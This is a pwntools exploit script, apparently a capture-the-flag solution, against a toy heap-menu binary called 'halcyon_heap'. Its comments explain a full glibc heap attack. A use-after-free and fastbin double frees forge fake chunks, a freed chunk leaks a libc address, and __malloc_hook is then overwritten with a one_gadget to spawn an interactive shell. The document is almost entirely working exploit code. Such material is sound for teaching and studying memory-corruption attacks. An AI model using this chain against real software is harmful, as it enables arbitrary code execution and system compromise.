from pwn import *

e = ELF("./halcyon_heap")
libc = ELF("libc.so.6")

context.log_level = "debug"
context.terminal =["tmux", "split", "-h"]
context.binary = e.path

is_remote = "--remote" in sys.argv

if is_remote:
  r = remote("", 1234)
else:
  env = {"LD_PRELOAD": libc.path}
  r = process(e.path, env=env)

def debug():
  if not is_remote:
      gdb.attach(r)

next_idx = 0

def create_deet(size, value):
  global next_idx
  r.sendline('1')
  r.sendlineafter('> ', str(size))
  r.sendlineafter('> ', value)
  r.recvuntil('> ')
  result = next_idx
  next_idx += 1
  return result

def delete_deet(idx):
  r.sendline('3')
  r.sendlineafter('>', str(idx))
  r.recvuntil('> ')

def view_deet(idx):
  r.sendline('2')
  r.sendlineafter('> ', str(idx))
  res = r.recvuntil('> ')
  end = res.find('Welcome to Halcyon')
  deet = res[:end]
  log.info('deet ' + str(idx) + ':')
  print(hexdump(deet))
  return deet

debug()

r.recv()

# use after free in a and b in fastbins, b fwd will point to a chunk header because fastbin looks like b -> a

a = create_deet(64, '')
b = create_deet(64, '')

delete_deet(a)
delete_deet(b)

res = view_deet(b)
heap_base = u64(res.rstrip('\x00').ljust(8, '\x00'))
log.info('heap base: ' + hex(heap_base))

# double free a to make fastbin look like a -> b -> a

delete_deet(a)

# we want to create a fake chunk, goal is to make fastbin look like b -> a -> fake_chunk -> ???
# by using our double free, we can set the 'data' of 'a' which is treated as fwd pointer later because of the double free
# fwd is + 0x10 because it is the overflow we want. data begins 0x10 after chunk header and we want to control chunk header with our fake chunk
# fake chunk must pass two security checks: size must be fastbin and prev_inuse flag must be on
# to pass the checks: 0x51 = 64 + 0x10 + 1 [64 for chunk size, 0x10 for size of chunk header, 1 for prev_inuse flag] 

c = create_deet(64, p64(heap_base + 0x10) + p64(0x51)) # fastbin now looks like: b -> a

#d = create_deet(64, '') # 'b'; fastbin now looks like a
d = create_deet(64, p64(heap_base + 0x50) + p64(heap_base + 0x50)) # same as prev; setup fw and bk pointers to pass unlink check
e = create_deet(64, '') # 'a'; fastbin now looks like fake_chunk -> ???

# now the last 0x10 bytes of our fake chunk overlap with next chunk
# both 'a' and 'b' are inuse with 'a' overflowing into 'b' chunk header
# resize 'b' chunk so it is a small chunk (0xa0); when small chunks are freed, fwd is somewhere in libc which we will leak later 

f = create_deet(64, p64(0) * 7 + p64(0xa0)) # size of 'b' chunk is now correct but we can't free it yet because of security checks

# create a fake chunk at b + b.size in the smallbin (size = 0x78)
# we must now tackle security check that prev_inuse flag is not set for next chunk "double free or corruption (!prev)" error
# new chunk must also have correct prevsize to fix "corrupted size vs. prev_size"

# g chunk is now getting checked but and we must make it so wilderness is after it 
# set size so it is correct for what we are allocating (it is concurrent) and allocator thinks wilderness is after this [NOTE: We are mallocing and setting chunk size at same time]
# 0x78 - (8 * 8) - 8 + 1 [0x78 for chunk size, 8 * 8 for padding 0s, 8 for prev_size, 1 for prev_inuse]
# not sure about the reasoning to make the next chunk the wilderness

g = create_deet(0x78, p64(0) * 8 + p64(0xa0) + p64(0x78 - 64 - 8 + 1))

delete_deet(b)

res = view_deet(b)
main_arena = u64(res[:8])
log.info('main arena: ' + hex(main_arena))

# calculate libc base offset from main arena
# 1. info proc mappings > get the libc from with the lowest offset 
# 2. calculate difference between leaked addr and libc base (will be constant)

libc.address = main_arena - 0x3c4b78 
log.info('libc base: ' + hex(libc.address))

# overwrite malloc_hook with a one_gadget
# use double free as write what where primitive

one_gadget_offset = 0xf1147
__malloc_hook = libc.symbols['__malloc_hook']

# note: these new notes must be in a different bin than before
# we choose 0x68 because when the header (0x10) is added 0x78 is in same fastbin as 0x7f (our chunk size)

h = create_deet(0x68, '')
i = create_deet(0x68, '')

delete_deet(h)
delete_deet(i)
delete_deet(h) # fasbin now looks like h -> i -> h

#j = create_deet(0x30, p64(__malloc_hook)) # set data of 'j' which will be fwd later 
# above fails because "malloc(): memory corruption (fast)" what it thinks is the header is not a valid fastbin chunk size
j = create_deet(0x68, p64(__malloc_hook - 0x23)) # 0x23 = __malloc_hook - 0x7f4159df4af5
k = create_deet(0x68, '') # alloc 'k'
l = create_deet(0x68, '') # alloc 'j'; fastbin now looks like __malloc_hook -> 

m = create_deet(0x68, '\x00' * 0x13 + p64(libc.address + one_gadget_offset)) # pad with null bytes then we have now set __malloc_hook = one gadget

r.sendline('1')
r.sendlineafter('> ', '1') # force a trigger of malloc to call our one_gadget

r.interactive()
